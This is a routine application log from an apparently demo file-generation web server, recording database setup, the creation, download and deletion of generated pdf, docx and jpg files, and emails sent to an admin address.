2025-01-22 12:05:43 - INFO - init_db:86 - 'protections' table created successfully.
2025-01-22 12:05:43 - DEBUG - init_db:93 - Database connection closed after init_db.
2025-01-22 12:05:43 - INFO - init_db_for_generated_files:103 - Initializing generated_files database.
2025-01-22 12:05:43 - DEBUG - init_db_for_generated_files:109 - Dropping existing 'generated_files' table if it exists.
2025-01-22 12:05:43 - DEBUG - init_db_for_generated_files:113 - Creating 'generated_files' table.
2025-01-22 12:05:43 - INFO - init_db_for_generated_files:133 - 'generated_files' table created successfully.
2025-01-22 12:05:43 - DEBUG - init_db_for_generated_files:140 - Database connection closed after init_db_for_generated_files.
2025-01-22 12:05:43 - INFO - load_csv_to_db:259 - Starting to load CSV data into protections database.
2025-01-22 12:05:43 - WARNING - load_csv_to_db:276 - Skipping row 10: Missing ProtectionName or Resource.
2025-01-22 12:05:43 - WARNING - load_csv_to_db:276 - Skipping row 16: Missing ProtectionName or Resource.
2025-01-22 12:05:43 - INFO - load_csv_to_db:311 - CSV data loaded successfully into protections database.
2025-01-22 12:05:43 - DEBUG - load_csv_to_db:317 - Database connection closed after load_csv_to_db.
2025-01-22 12:07:24 - INFO - delete_generated_file:557 - Attempting to delete generated file: generated_pdf_file_7279.pdf
2025-01-22 12:07:24 - INFO - delete_generated_file:564 - File 'generated_pdf_file_7279.pdf' deleted from database.
2025-01-22 12:07:24 - DEBUG - delete_generated_file:571 - Database connection closed after delete_generated_file.
2025-01-22 12:07:24 - INFO - delete_generated_file:578 - File 'generated_pdf_file_7279.pdf' deleted from filesystem.
2025-01-22 12:07:24 - INFO - delete_file:297 - Deleted file: generated_pdf_file_7279.pdf
2025-01-22 12:07:24 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:07:24 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-22 12:07:24 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:07:42 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_docx_file_3104.docx
2025-01-22 12:07:42 - INFO - save_generated_file_to_db:455 - Generated file 'generated_docx_file_3104.docx' saved successfully.
2025-01-22 12:07:42 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 12:07:42 - INFO - generate:425 - File of type 'docx' generated successfully.
2025-01-22 12:07:42 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:07:42 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 12:07:42 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:07:44 - INFO - send_email_route:641 - Email sent successfully to cpadmin@americas-ses.com.
2025-01-22 12:07:44 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:07:44 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 12:07:44 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:08:03 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_pdf_file_4754.pdf
2025-01-22 12:08:03 - INFO - save_generated_file_to_db:455 - Generated file 'generated_pdf_file_4754.pdf' saved successfully.
2025-01-22 12:08:03 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 12:08:03 - INFO - generate:425 - File of type 'pdf' generated successfully.
2025-01-22 12:08:03 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:08:03 - DEBUG - load_generated_files:499 - Fetched 2 records from 'generated_files' table.
2025-01-22 12:08:03 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:08:05 - INFO - send_email_route:641 - Email sent successfully to cpadmin@americas-ses.com.
2025-01-22 12:08:05 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:08:05 - DEBUG - load_generated_files:499 - Fetched 2 records from 'generated_files' table.
2025-01-22 12:08:05 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:08:48 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-22 12:08:48 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-22 12:08:48 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-22 12:08:48 - INFO - delete_all_generated_files:613 - File 'generated_jpg_file_1034.jpg' deleted from filesystem.
2025-01-22 12:08:48 - INFO - delete_all_generated_files:613 - File 'generated_docx_file_3104.docx' deleted from filesystem.
2025-01-22 12:08:48 - INFO - delete_all_generated_files:613 - File 'generated_pdf_file_4754.pdf' deleted from filesystem.
2025-01-22 12:08:48 - INFO - delete_all_generated_files:613 - File 'generated_jpg_file_3070.jpg' deleted from filesystem.
2025-01-22 12:08:48 - INFO - delete_all_generated_files:613 - File 'generated_jpg_file_4648.jpg' deleted from filesystem.
2025-01-22 12:08:48 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-22 12:08:48 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:08:48 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-22 12:08:48 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:08:52 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_docx_file_5439.docx
2025-01-22 12:08:52 - INFO - save_generated_file_to_db:455 - Generated file 'generated_docx_file_5439.docx' saved successfully.
2025-01-22 12:08:52 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 12:08:52 - INFO - generate:425 - File of type 'docx' generated successfully.
2025-01-22 12:08:52 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:08:52 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 12:08:52 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:08:54 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_docx_file_5439.docx with MIME type: application/vnd.openxmlformats-officedocument.wordprocessingml.document
2025-01-22 12:09:55 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-22 12:09:55 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-22 12:09:55 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-22 12:09:55 - INFO - delete_all_generated_files:613 - File 'generated_jpg_file_7391.jpg' deleted from filesystem.
2025-01-22 12:09:55 - INFO - delete_all_generated_files:613 - File 'generated_docx_file_5439.docx' deleted from filesystem.
2025-01-22 12:09:55 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-22 12:09:55 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:09:55 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-22 12:09:55 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:10:00 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_docx_file_3204.docx
2025-01-22 12:10:00 - INFO - save_generated_file_to_db:455 - Generated file 'generated_docx_file_3204.docx' saved successfully.
2025-01-22 12:10:00 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 12:10:00 - INFO - generate:425 - File of type 'docx' generated successfully.
2025-01-22 12:10:00 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:10:00 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 12:10:00 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:10:02 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_docx_file_3204.docx with MIME type: application/vnd.openxmlformats-officedocument.wordprocessingml.document
2025-01-22 12:10:47 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-22 12:10:47 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-22 12:10:47 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-22 12:10:47 - INFO - delete_all_generated_files:613 - File 'generated_docx_file_3204.docx' deleted from filesystem.
2025-01-22 12:10:47 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-22 12:10:47 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:10:47 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-22 12:10:47 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:10:53 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_docx_file_9370.docx
2025-01-22 12:10:53 - INFO - save_generated_file_to_db:455 - Generated file 'generated_docx_file_9370.docx' saved successfully.
2025-01-22 12:10:53 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 12:10:53 - INFO - generate:425 - File of type 'docx' generated successfully.
2025-01-22 12:10:53 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:10:53 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 12:10:53 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:10:55 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_docx_file_9370.docx with MIME type: application/vnd.openxmlformats-officedocument.wordprocessingml.document
2025-01-22 12:11:28 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-22 12:11:28 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-22 12:11:28 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-22 12:11:28 - INFO - delete_all_generated_files:613 - File 'generated_docx_file_9370.docx' deleted from filesystem.
2025-01-22 12:11:28 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-22 12:11:28 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:11:28 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-22 12:11:28 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:11:35 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_pdf_file_8731.pdf
2025-01-22 12:11:35 - INFO - save_generated_file_to_db:455 - Generated file 'generated_pdf_file_8731.pdf' saved successfully.
2025-01-22 12:11:35 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 12:11:35 - INFO - generate:425 - File of type 'pdf' generated successfully.
2025-01-22 12:11:35 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:11:35 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 12:11:35 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:11:37 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_pdf_file_8731.pdf with MIME type: application/pdf
2025-01-22 12:11:58 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-22 12:11:58 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-22 12:11:58 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-22 12:11:58 - INFO - delete_all_generated_files:613 - File 'generated_pdf_file_8731.pdf' deleted from filesystem.
2025-01-22 12:11:58 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-22 12:11:58 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:11:58 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-22 12:11:58 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:12:05 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_jpg_file_3537.jpg
2025-01-22 12:12:05 - INFO - save_generated_file_to_db:455 - Generated file 'generated_jpg_file_3537.jpg' saved successfully.
2025-01-22 12:12:05 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 12:12:05 - INFO - generate:425 - File of type 'jpg' generated successfully.
2025-01-22 12:12:05 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:12:05 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 12:12:05 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:12:06 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_jpg_file_3537.jpg with MIME type: image/jpeg
2025-01-22 12:12:08 - INFO - send_email_route:641 - Email sent successfully to cpadmin@americas-ses.com.
2025-01-22 12:12:08 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:12:08 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 12:12:08 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:12:32 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-22 12:12:32 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-22 12:12:32 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-22 12:12:32 - INFO - delete_all_generated_files:613 - File 'generated_jpg_file_3537.jpg' deleted from filesystem.
2025-01-22 12:12:32 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-22 12:12:32 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:12:32 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-22 12:12:32 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:21:33 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_docx_file_4651.docx
2025-01-22 12:21:33 - INFO - save_generated_file_to_db:455 - Generated file 'generated_docx_file_4651.docx' saved successfully.
2025-01-22 12:21:33 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 12:21:33 - INFO - generate:425 - File of type 'docx' generated successfully.
2025-01-22 12:21:33 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:21:33 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 12:21:33 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:24:03 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_docx_file_4651.docx with MIME type: application/vnd.openxmlformats-officedocument.wordprocessingml.document
2025-01-22 12:24:20 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:24:20 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 12:24:20 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:24:26 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:24:26 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 12:24:26 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:24:30 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_docx_file_4651.docx with MIME type: application/vnd.openxmlformats-officedocument.wordprocessingml.document
2025-01-22 12:24:41 - INFO - delete_generated_file:557 - Attempting to delete generated file: generated_docx_file_4651.docx
2025-01-22 12:24:41 - INFO - delete_generated_file:564 - File 'generated_docx_file_4651.docx' deleted from database.
2025-01-22 12:24:41 - DEBUG - delete_generated_file:571 - Database connection closed after delete_generated_file.
2025-01-22 12:24:41 - INFO - delete_generated_file:578 - File 'generated_docx_file_4651.docx' deleted from filesystem.
2025-01-22 12:24:41 - INFO - delete_file:297 - Deleted file: generated_docx_file_4651.docx
2025-01-22 12:24:42 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:24:42 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-22 12:24:42 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:24:53 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_docx_file_4680.docx
2025-01-22 12:24:53 - INFO - save_generated_file_to_db:455 - Generated file 'generated_docx_file_4680.docx' saved successfully.
2025-01-22 12:24:53 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 12:24:53 - INFO - generate:425 - File of type 'docx' generated successfully.
2025-01-22 12:24:53 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:24:53 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 12:24:53 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:25:03 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_docx_file_4680.docx with MIME type: application/vnd.openxmlformats-officedocument.wordprocessingml.document
2025-01-22 12:37:06 - INFO - delete_generated_file:557 - Attempting to delete generated file: generated_docx_file_4680.docx
2025-01-22 12:37:06 - INFO - delete_generated_file:564 - File 'generated_docx_file_4680.docx' deleted from database.
2025-01-22 12:37:06 - DEBUG - delete_generated_file:571 - Database connection closed after delete_generated_file.
2025-01-22 12:37:06 - INFO - delete_generated_file:578 - File 'generated_docx_file_4680.docx' deleted from filesystem.
2025-01-22 12:37:06 - INFO - delete_file:297 - Deleted file: generated_docx_file_4680.docx
2025-01-22 12:37:06 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:37:06 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-22 12:37:06 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:39:26 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_pdf_file_7210.pdf
2025-01-22 12:39:26 - INFO - save_generated_file_to_db:455 - Generated file 'generated_pdf_file_7210.pdf' saved successfully.
2025-01-22 12:39:26 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 12:39:26 - INFO - generate:425 - File of type 'pdf' generated successfully.
2025-01-22 12:39:26 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:39:26 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 12:39:26 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:39:27 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_pdf_file_7210.pdf with MIME type: application/pdf
2025-01-22 12:40:29 - INFO - delete_generated_file:557 - Attempting to delete generated file: generated_pdf_file_7210.pdf
2025-01-22 12:40:29 - INFO - delete_generated_file:564 - File 'generated_pdf_file_7210.pdf' deleted from database.
2025-01-22 12:40:29 - DEBUG - delete_generated_file:571 - Database connection closed after delete_generated_file.
2025-01-22 12:40:29 - INFO - delete_generated_file:578 - File 'generated_pdf_file_7210.pdf' deleted from filesystem.
2025-01-22 12:40:29 - INFO - delete_file:297 - Deleted file: generated_pdf_file_7210.pdf
2025-01-22 12:40:29 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:40:29 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-22 12:40:29 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:40:33 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_pdf_file_5468.pdf
2025-01-22 12:40:33 - INFO - save_generated_file_to_db:455 - Generated file 'generated_pdf_file_5468.pdf' saved successfully.
2025-01-22 12:40:33 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 12:40:33 - INFO - generate:425 - File of type 'pdf' generated successfully.
2025-01-22 12:40:33 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:40:33 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 12:40:33 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:40:36 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_pdf_file_5468.pdf with MIME type: application/pdf
2025-01-22 12:41:30 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_pdf_file_5278.pdf
2025-01-22 12:41:30 - INFO - save_generated_file_to_db:455 - Generated file 'generated_pdf_file_5278.pdf' saved successfully.
2025-01-22 12:41:30 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 12:41:30 - INFO - generate:425 - File of type 'pdf' generated successfully.
2025-01-22 12:41:30 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:41:30 - DEBUG - load_generated_files:499 - Fetched 2 records from 'generated_files' table.
2025-01-22 12:41:30 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:41:39 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_pdf_file_5278.pdf with MIME type: application/pdf
2025-01-22 12:42:36 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-22 12:42:36 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-22 12:42:36 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-22 12:42:36 - INFO - delete_all_generated_files:613 - File 'generated_pdf_file_5278.pdf' deleted from filesystem.
2025-01-22 12:42:36 - INFO - delete_all_generated_files:613 - File 'generated_jpg_file_1881.jpg' deleted from filesystem.
2025-01-22 12:42:36 - INFO - delete_all_generated_files:613 - File 'generated_jpg_file_8903.jpg' deleted from filesystem.
2025-01-22 12:42:36 - INFO - delete_all_generated_files:613 - File 'generated_pdf_file_5468.pdf' deleted from filesystem.
2025-01-22 12:42:36 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-22 12:42:36 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:42:36 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-22 12:42:36 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:42:45 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_pdf_file_7920.pdf
2025-01-22 12:42:45 - INFO - save_generated_file_to_db:455 - Generated file 'generated_pdf_file_7920.pdf' saved successfully.
2025-01-22 12:42:45 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 12:42:45 - INFO - generate:425 - File of type 'pdf' generated successfully.
2025-01-22 12:42:45 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:42:45 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 12:42:45 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:42:47 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_pdf_file_7920.pdf with MIME type: application/pdf
2025-01-22 12:43:14 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-22 12:43:14 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-22 12:43:14 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-22 12:43:14 - INFO - delete_all_generated_files:613 - File 'generated_pdf_file_7920.pdf' deleted from filesystem.
2025-01-22 12:43:14 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-22 12:43:14 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:43:14 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-22 12:43:14 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:43:21 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_pdf_file_5825.pdf
2025-01-22 12:43:21 - INFO - save_generated_file_to_db:455 - Generated file 'generated_pdf_file_5825.pdf' saved successfully.
2025-01-22 12:43:21 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 12:43:21 - INFO - generate:425 - File of type 'pdf' generated successfully.
2025-01-22 12:43:21 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:43:21 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 12:43:21 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:43:22 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_pdf_file_5825.pdf with MIME type: application/pdf
2025-01-22 12:43:44 - INFO - delete_generated_file:557 - Attempting to delete generated file: generated_pdf_file_5825.pdf
2025-01-22 12:43:44 - INFO - delete_generated_file:564 - File 'generated_pdf_file_5825.pdf' deleted from database.
2025-01-22 12:43:44 - DEBUG - delete_generated_file:571 - Database connection closed after delete_generated_file.
2025-01-22 12:43:44 - INFO - delete_generated_file:578 - File 'generated_pdf_file_5825.pdf' deleted from filesystem.
2025-01-22 12:43:44 - INFO - delete_file:297 - Deleted file: generated_pdf_file_5825.pdf
2025-01-22 12:43:44 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:43:44 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-22 12:43:44 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:43:58 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_pdf_file_8035.pdf
2025-01-22 12:43:58 - INFO - save_generated_file_to_db:455 - Generated file 'generated_pdf_file_8035.pdf' saved successfully.
2025-01-22 12:43:58 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 12:43:58 - INFO - generate:425 - File of type 'pdf' generated successfully.
2025-01-22 12:43:58 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:43:58 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 12:43:58 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:44:00 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_pdf_file_8035.pdf with MIME type: application/pdf
2025-01-22 12:44:39 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-22 12:44:39 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-22 12:44:39 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-22 12:44:39 - INFO - delete_all_generated_files:613 - File 'generated_pdf_file_8035.pdf' deleted from filesystem.
2025-01-22 12:44:39 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-22 12:44:39 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:44:39 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-22 12:44:39 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:47:03 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_pdf_file_3830.pdf
2025-01-22 12:47:03 - INFO - save_generated_file_to_db:455 - Generated file 'generated_pdf_file_3830.pdf' saved successfully.
2025-01-22 12:47:03 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 12:47:03 - INFO - generate:425 - File of type 'pdf' generated successfully.
2025-01-22 12:47:03 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 12:47:03 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 12:47:03 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 12:47:05 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_pdf_file_3830.pdf with MIME type: application/pdf
2025-01-22 13:01:03 - INFO - delete_generated_file:557 - Attempting to delete generated file: generated_pdf_file_3830.pdf
2025-01-22 13:01:03 - INFO - delete_generated_file:564 - File 'generated_pdf_file_3830.pdf' deleted from database.
2025-01-22 13:01:03 - DEBUG - delete_generated_file:571 - Database connection closed after delete_generated_file.
2025-01-22 13:01:03 - INFO - delete_generated_file:578 - File 'generated_pdf_file_3830.pdf' deleted from filesystem.
2025-01-22 13:01:03 - INFO - delete_file:297 - Deleted file: generated_pdf_file_3830.pdf
2025-01-22 13:01:03 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 13:01:03 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-22 13:01:03 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 13:02:20 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_pdf_file_4680.pdf
2025-01-22 13:02:20 - INFO - save_generated_file_to_db:455 - Generated file 'generated_pdf_file_4680.pdf' saved successfully.
2025-01-22 13:02:20 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-22 13:02:20 - INFO - generate:425 - File of type 'pdf' generated successfully.
2025-01-22 13:02:20 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-22 13:02:20 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-22 13:02:20 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-22 13:02:22 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_pdf_file_4680.pdf with MIME type: application/pdf
2025-01-22 13:11:26 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-22 13:11:26 - INFO - delete_all_generated_files:597 - All files deleted from database.
